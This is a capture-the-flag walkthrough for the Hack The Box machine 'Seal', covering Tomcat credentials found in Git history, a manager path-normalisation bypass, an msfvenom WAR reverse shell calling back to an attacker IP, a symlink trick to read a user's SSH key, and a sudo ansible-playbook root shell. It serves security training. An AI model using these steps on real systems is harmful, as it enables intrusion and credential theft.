## Seal

Difficulty: Medium

### User Flag

#### Foothold

```
rustscan -a seal.htb --ulimit 5000 -- -A -sV -sC
```

![rustscan](https://github.com/b1d0ws/OSCP/assets/58514930/73fb3362-11b5-401d-a681-72fa89bed2be)

<br>

The website only reveals us the domain name: seal.htb.

![website](https://github.com/b1d0ws/OSCP/assets/58514930/ed312ee3-de05-4413-b807-d662dd9c1827)

<br>

On port 8080, there is GitBucket and we can create our user to see the repositories inside it.

![gitBucket](https://github.com/b1d0ws/OSCP/assets/58514930/c10ef2bb-724e-441a-a70f-b28f5a7bb64c)

![repositories](https://github.com/b1d0ws/OSCP/assets/58514930/820f4c40-6f68-4938-aa22-3a5495a1fbf2)

<br>

Inside root/seal_market, we can find the tomcat credentials searching in history commits of tomcat-users.xml file.   

Also, the todo list on readme give us some hint about mutual authentication being used.

![tomcatUser](https://github.com/b1d0ws/OSCP/assets/58514930/76e92c17-6c10-4514-84e6-f75131d1a21a)

![sealMarketToDo](https://github.com/b1d0ws/OSCP/assets/58514930/5e0e3975-f5ee-42a6-8d84-3e10fe5dc12a)

<br>

As we see in the repository, the project is using nginx and tomcat.  

If we try to access tomcat panel, we get blocked.

![tryingDashboard](https://github.com/b1d0ws/OSCP/assets/58514930/f86f5cf3-d2eb-450d-ac5d-6d334f85fb4e)

<br>

Searching for tomcat mutual authentication bypass, we find [this article]() explaining how to do this.  

The article is based on this [blackhat presentation](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf).  

So to bypass, we can trick the proxy accessing "manager;name=orange/html/".

![accessingDashboard](https://github.com/b1d0ws/OSCP/assets/58514930/367ce80c-8e9c-4b3b-9125-56822c51456b)

<br>

Now just upload a war reverse shell file as usual in tomcat panels.

```
# Generate Payload
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.11 LPORT=1337 -f war -o revshell.war

# Access the payload
https://10.10.10.250/revshell/
```

![uploadingRevshell](https://github.com/b1d0ws/OSCP/assets/58514930/0ddfeb45-777c-40b0-a537-3674c9aec28b)

<br>

#### User Access

We can manual spot or use pspy to find that ansible is running commands on the background. Inside /opt/backups there are files related to this behavior.  

Reading run.yml we see that this playbook is copying files from /var/lib/tomcat9/webapps/ROOT/admin/dashboard and the copy_links option is enabled.

![runYML](https://github.com/b1d0ws/OSCP/assets/58514930/ded423e3-4493-4220-bd2f-73a69adbf81e)

<br>

This flag says that the symlink will point to the original files.  

Since we can write on /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/, we can abuse this to point to a file we want to read, in this case, luis ssh key.

```
# Creating a symlink pointing to luis SSH Key
ln -s /home/luis/.ssh/id_rsa /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/sshKey

# Now transfer the file result in gz format inside /archives to /tmp and extract it with gunzip and tar.
cd archives
mv backup-2023-07-25-00\:50\:32.gz /tmp/backup.gz
gunzip backup.gz
tar -xzf backup
cat dashboard/uploads/sshKey
```

![writableUploads](https://github.com/b1d0ws/OSCP/assets/58514930/e22fe7fa-1ca2-4ceb-8ed2-ee80ce50a6be)

![creatingLink](https://github.com/b1d0ws/OSCP/assets/58514930/fc8988ac-5f99-4f3c-ab1b-ed96ff97c0e0)

![extractingBackup](https://github.com/b1d0ws/OSCP/assets/58514930/7003a05b-1fae-4564-a41b-42fb110eac2c)

![gettingSshKey](https://github.com/b1d0ws/OSCP/assets/58514930/e570aab7-2168-488c-ac1d-1dc5664be0a5)

<br>

### Root Flag

The privilege escalation is on sudo -l. Our user can use ansible-playbook as sudo on any file. Just proceed as shown in gtfobins.

```
TF=$(mktemp)
echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
sudo ansible-playbook $TF
```

![privEsc](https://github.com/b1d0ws/OSCP/assets/58514930/157f3587-7638-43bf-a2b0-541686e6d7dd)
